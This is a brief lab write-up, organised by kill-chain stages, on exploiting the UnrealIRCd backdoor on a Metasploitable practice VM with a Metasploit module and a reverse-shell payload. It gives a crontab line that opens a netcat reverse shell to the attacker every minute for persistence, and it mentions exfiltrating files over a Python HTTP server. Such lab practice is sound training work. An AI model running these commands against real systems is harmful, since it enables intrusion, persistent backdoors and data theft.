# Exploiting `unrealirc`

## Metasploitable Method

### Reconnaissance
- Netdiscover to identify IP Address of Metasploitable (Target) VM 
- A bash script running nmap scans to identify: 
    - Open Ports 
    - Services 
    - Versions 
    - Operating System

- Identified Port 6667 is open and running unrealIRC which is vulnerable to Command Execution 

### Weaponization
- - Used Metasploit Framework to automate the exploit 
- The exploit used is unreal_ircd_3281_backdoor 
- Metaploit path is `exploit/unix/irc/unreal_ircd_3281_backdoor`
- The payload used is cmd/unix/reverse

```bash 
msfconsole 
use exploit/unix/irc/unreal_ircd_3281_backdoor
set PAYLOAD cmd/unix/reverse
set RHOSTS 192.168.56.105 # Target IP
set LHOSTS 192.168.56.106 # Kali IP
```

### Delivery
- Ran exploit 

```bash 
run
```

### Exploitation 
- Grants terminal access as "root"
- Can be confirmed by running `whoami`

### Installation 
- Created a cronjob that connects back to Kali machine with shell access 

```bash 
echo "* * * * * nc -e /bin/bash <kali_ip> 4444" >> /etc/crontab
```

### Command And Control 
- Even after the Metasploitable machine is rebooted the cronjob will attempt to connect back to the listener 

### Actions On Objectives 

- Exploitation was achieved 
- A persistent backdoor was created 
- Exfiltration of files using `python3 -m http.server`
